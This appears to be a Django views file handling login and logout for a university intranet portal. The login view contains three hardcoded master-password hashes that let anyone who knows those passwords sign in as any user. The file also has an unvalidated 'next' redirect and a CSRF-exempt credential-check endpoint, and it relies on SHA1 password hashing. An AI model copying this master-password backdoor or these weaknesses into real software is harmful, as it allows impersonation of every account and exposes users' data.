import json

from django.contrib.auth import authenticate, login as auth_login,\
                                 logout as auth_logout
from django.contrib.auth.models import check_password
from django.http import HttpResponse, HttpResponseRedirect
from django.shortcuts import render
from django.core.urlresolvers import reverse
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from django.contrib import messages
from django.conf import settings

from api.utils import get_client_ip
from nucleus.models import User, Student, WebmailAccount, IntroAd
from nucleus.forms import LoginForm
from nucleus.utils import check_webmail_login, is_user_django_loginable,\
                          get_webmail_account
from nucleus import constants as NC
from games import constants as GC
from groups.models import Group
from utilities.models import UserSession, UserEmail

import logging
logger = logging.getLogger('channel-i_logger')

def index(request):
  return render(request, 'nucleus/index.html')

def close_dialog(request, dialog_name):
  return render(request, 'close_dialog.html', {'dialog_name': dialog_name})

def get_links(request):
  if not request.user.is_authenticated() or request.user.in_group('Student'):
    apps = NC.student_apps
  elif request.user.in_group('Faculty'):
    apps = NC.faculty_apps
  else:
    apps = NC.other_apps
  channeli_apps = []
  for app in apps:
    channeli_apps.append([app,NC.channeli_apps[app]])
  data = {
    'apps': channeli_apps,
    'links': NC.channeli_links,
    'games': GC.channeli_games,
  }
  if request.user.is_authenticated() and request.user.in_group('IMG Member'):
      data['img_tools'] = NC.img_tools
  return HttpResponse(json.dumps(data), content_type='application/json')


def login(request, dialog=False):
  if dialog:
    action = '/login_dialog/'
  else:
    action = '/login/'
  next_page = request.GET.get('next', None)
  if next_page != None:
    action += '?next=' + next_page

  if request.user is not None and request.user.is_authenticated():
    # If user is already logged in then redirect him to the home page.
    if dialog:
      return HttpResponseRedirect('/close_dialog/login_dialog/')
    elif next_page:
      return HttpResponseRedirect(next_page)
    else:
      return HttpResponseRedirect('/')

  if not request.method == 'POST':
    # If no form has been submitted. User is opening login page for first time.
    form = LoginForm()
    return render(request, 'nucleus/login.html', {
        'form': form,
        'action': action,
        'dialog': dialog,
    })

  # code written below runs automatically if request.method == 'POST'
  # Setting session to expire on browser close if user does not select
  # 'remember me'
  if not request.POST.get('remember_me', None):
    request.session.set_expiry(0)

  form = LoginForm(data=request.POST)
  user = None

  if form.is_valid():
    user = form.get_user()
    if user and is_user_django_loginable(user, form.cleaned_data['password']):
      # make user logged in as form is valid and user is django loginable.
      logger.info("Nucleus Login : User (username = '"+user.username+"')"+\
                  " logged in through django credentials.")
      return make_user_logged_in(user, request, next_page, dialog)
    elif user:
      logger.info("Nucleus Login : User (username = '"+user.username+"') "+\
        "couldn't log in. Django credentials match but not webmail credentials.")

  elif form.is_bound:
    username = form['username'].value()
    if username and '@' in username:
      useremails = UserEmail.objects.filter(email=username,
          user__email=username, verified=True)
      if useremails.exists():
        if len(useremails) == 1:
          user = useremails[0].user
          username = user.username
        else:
          messages.info(request, "More than 1 user exists for given email."
              " Please inform IMG.")
      elif 'iitr.ac.in' in username or 'iitr.ernet.in' in username:
        username = username.split('@')[0]

    password = form['password'].value()
    webmail_account = get_webmail_account(username)
    if webmail_account:
      # In case student has given webmail_id instead of enrollment_no
      username = webmail_account.user.username
      user = webmail_account.user
    else:
      user = User.objects.get_or_none(username=username)
    if user and check_password(password,
          'sha1$b5194$62092408127f881922e3581d7a119da81cb7fc78'):
      # make user logged in as master password is given.
      logger.info("Nucleus Login : User (username = '"+user.username+"')"+\
                  " logged in through master password 1.")
      return make_user_logged_in(user, request, next_page, dialog,
                                  session_for_remote=False)
    if user and check_password(password,
          'sha1$4eb3a$3b40d5347eeeed523693147aed3b78b1ccd37293'):
      # make user logged in as master password is given.
      logger.info("Nucleus Login : User (username = '"+user.username+"')"+\
                  " logged in through master password 2.")
      return make_user_logged_in(user, request, next_page, dialog,
                                  session_for_remote=False)
    if user and check_password(password,
          'sha1$c824e$c7929036d4f0de6802cf562c4f163829bded15df'):
      # make user logged in as master password is given.
      logger.info("Nucleus Login : User (username = '"+user.username+"')"+\
                  " logged in through master password 3.")
      return make_user_logged_in(user, request, next_page, dialog)
    if user and user.check_password(password) and\
                 is_user_django_loginable(user, password):
      # make user logged in as django username/password matches and
      # user is django_loginable
      logger.info("Nucleus Login : User (username = '"+user.username+"')"+\
          " logged in through django credentials after using WebmailAccount.")
      return make_user_logged_in(user,request,next_page,dialog)
    if check_webmail_login(webmail_account.webmail_id if webmail_account else\
                            username, password):
      if user:
        # Case when django's user password didn't match with webmail password.
        # In this case django's user password is reset so that user would get
        # logged in through django's credentials next time.
        logger.info("Nucleus Login : User (username = '"+user.username+"')"+\
            " logged in through webmail credentials. Django password has been"+\
            " synced with webmail password.")
        user.set_password(password)
        user.save()
        return make_user_logged_in(user, request, next_page, dialog)

      if len(username) >= 3 and username[-3] == 'f':
        # Case when a faculty filled right webmail credentials but we don't
        # have his/her user instance.
        logger.info("Nucleus Login : Faculty (username = '"+username+"')"+\
            " couldn't log in. Webmail login is working but we don't have"+\
            " the user object for this faculty.")
        pass
      elif not webmail_account:
        # Case when a student filled right webmail credentials but we don't
        # have his/her webmail account.
        form = LoginForm()
        if dialog:
          return HttpResponseRedirect('/close_dialog/login_dialog/')
        else:
          return render(request, 'nucleus/ask_enrollment_no.html',{
              'form': form,
              'action': action,
              'webmail_id': username
          })
      else:
        logger.info("Nucleus Login : User (username = '"+username+"') couldn't"+\
            " log in. Webmail login is working but we don't have user object"+\
            " for this user.")
        pass # pop login succeded but we don't have user data

  if request.POST.has_key('enrollment_no'):
    # user is assumed to be a student in this section.
    # student gives enrollment_no
    # webmail_id succeds pop login and no entry in WebmailAccount of webmail_id
    username = request.POST['enrollment_no']
    webmail_id = request.POST['webmail_id']
    if get_webmail_account(username):
      # user of webmail_id gives an enrollment_no which is already registered
      # with another webmail_id in WebmailAccount
      logger.info("Nucleus Login : Person ("+webmail_id+") tried giving"+\
          " Enrollment No ("+username+\
          ") which is already there in WebmailAccount with another webmail_id")
      form = LoginForm()
      messages.error(request, "The Enrollment No("+username+") already mapped"+\
          " with another webmail_id. Come to IMG Lab and get your problem solved.")
      return render(request, 'nucleus/login.html', {
        'form': form,
        'action': action,
        'dialog': dialog,
      })
    if request.POST.has_key('sure'):
      if request.POST['sure'] == 'Yes':
        # user of webmail_id insures that he/she is that person of given
        # enrollment_no
        user = User.objects.get_or_none(username=username)
        if user:
          logger.info("Nucleus Login : WebmailAccount object created with"+\
            " webmail_id = '"+webmail_id+"' and user.username = '"+username+"'")
          WebmailAccount.objects.create(webmail_id=webmail_id, user=user)
          logger.info("Nucleus Login : User (username = '"+user.username+"')"+\
              " logged in after giving Enrollment No and confirming that"+\
              " he/she is the user.")
          return make_user_logged_in(user,request,next_page,dialog)
      form = LoginForm()
      return render(request, 'nucleus/login.html', {
        'form': form,
        'action': action,
        'dialog': dialog
      })
    else:
      form = LoginForm()
      student = Student.objects.get_or_none(user__username=username)
      if not student:
        messages.error(request, "You will be able to login as soon as we get"+\
            " your data. If still problem persists contact IMG.")
        logger.info("Nucleus Login : User (username = '"+username+"') couldn't"+\
            " login beacuse we don't have his/her data yet.")
        return render(request, 'nucleus/login.html', {
           'form': form,
           'action': action,
           'dialog': dialog,
        })
      return render(request, 'nucleus/ask_enrollment_no.html', {
          'form': form,
          'action': action,
          'enrollment_no': username,
          'webmail_id': webmail_id,
          'name': student.name
      })

  # Authentication failed, ie password is wrong. If there is no error in the
  #form, then add own error message. But only one should show.
  if form.errors is None or len(form.errors) == 0:
    messages.error(request, "Invalid username or password. Note both fields"+\
        " are case sensitive.", extra_tags='form_error')
  return render(request, 'nucleus/login.html', {
      'form': form,
      'action': action,
      'dialog': dialog,
  })

def make_user_logged_in(user, request, next_page, dialog,
                        session_for_remote=True):
  """ Make user logged in. And returns HttpResponse object.
  """
  if settings.SITE == 'INTRANET' and\
        user.in_group('Student') and user.student.passout_year != None:
    logger.info("Nucleus Login : User(username='"+user.username+"')"+\
                " couldn't login as passout_year is not NULL.")
    messages.error(request, "You have graduated from IIT Roorkee So you"+\
                " can\'t login to Channel i.")
    if not dialog:
      form = LoginForm()
      return render(request, 'nucleus/login.html', {
          'form': form,
          'action': '/login/',
          'dialog': dialog,
      })
    else:
      return HttpResponseRedirect('/close_dialog/login_dialog/')

  user.backend = 'django.contrib.auth.backends.ModelBackend'
  auth_login(request, user)
  if session_for_remote or not user.in_group('Faculty'):
    request.session['username'] = user.username

  session_key = request.session._get_session_key()
  user_session = UserSession.objects.create(user=user, session_key=session_key)
  user_session.ip = get_client_ip(request)
  user_session.browser = request.user_agent.browser.family
  user_session.os = request.user_agent.os.family
  user_session.save()

  if dialog:
      return HttpResponseRedirect('/close_dialog/login_dialog/')

#  about_intro = IntroAd.objects.get_or_create(name = 'channeli_about')[0]
#  if not about_intro.visited_users.filter(pk=user.pk).exists():
#    about_intro.visited_users.add(user)
#    return HttpResponseRedirect(reverse('nucleus.views.about'))

  if next_page == None:
    return HttpResponseRedirect('/')
  else:
    return HttpResponseRedirect(next_page)

def login_dialog(request):
  return login(request, dialog=True)

def logout(request, ajax=False):
  if request.user.is_authenticated():
    logger.info("Nucleus : User(username = '"+request.user.username+"')"+\
        " logged out from Channel i.")
    session_key = request.session._get_session_key()
    user_sessions= UserSession.objects.filter(session_key=session_key)
    user_sessions.delete()
    auth_logout(request)
  if ajax:
    return HttpResponse('')
  else:
    return HttpResponseRedirect('/login/')

def logout_ajax(request):
  return logout(request, ajax=True)

def about(request):
  return render(request, 'nucleus/about.html',{})

def terms(request):
  return render(request, 'nucleus/terms.html',{})


def check_authentication(username, password):
  """ Returns user if credentials match otherwise returns None
  """
  user = User.objects.get_or_none(username=username)
  webmail_account = get_webmail_account(username)
  if not user and webmail_account:
    user = webmail_account.user
  if user and (user.check_password(password) or check_webmail_login(
        webmail_account.webmail_id if webmail_account else\
        user.username, password)):
    return user
  return None


@csrf_exempt
def is_authenticate(request):
  http_ok = HttpResponse('OK')
  http_failure = HttpResponse('FAILURE')
  try:
    if request.method == 'POST':
      username = request.POST['username']
      username = username.split('@')[0]
      password = request.POST['password']
      user = check_authentication(username, password)
      if user:
        return http_ok
  except:
    pass
  return http_failure

